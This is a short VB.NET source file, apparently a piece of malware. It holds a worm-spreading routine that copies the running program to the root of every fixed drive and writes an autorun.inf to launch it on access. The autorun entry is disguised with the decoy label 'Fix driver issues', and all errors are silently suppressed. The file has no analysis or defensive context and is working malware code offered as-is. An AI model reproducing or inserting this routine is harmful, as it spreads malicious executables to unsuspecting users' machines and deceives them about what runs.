Imports System.IO
Imports System.Windows.Forms

Public Class SPDRVE

    Public Shared Sub SP_FIXED(ByVal OutName As String)
        On Error Resume Next
        For Each x In IO.DriveInfo.GetDrives
            If x.IsReady Then
                If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType.Fixed Then
                    IO.File.Copy(Reflection.Assembly.GetExecutingAssembly.Location, x.Name & OutName, True)
                    Dim AutoStart = New IO.StreamWriter(x.Name & "autorun.inf")
                    AutoStart.WriteLine("[autorun]")
                    AutoStart.WriteLine("open=" & x.Name & OutName)
                    AutoStart.WriteLine("shellexecute=" & x.Name & OutName, 1)
                    AutoStart.WriteLine("shellopencommand=" & x.Name & OutName)
                    AutoStart.WriteLine("shellexplorecommand=" & x.Name & OutName)
                    AutoStart.WriteLine("shell\open\default=1")
                    AutoStart.WriteLine("action=Fix driver issues")
                    AutoStart.Close()
                End If
            End If
        Next
    End Sub
End Class
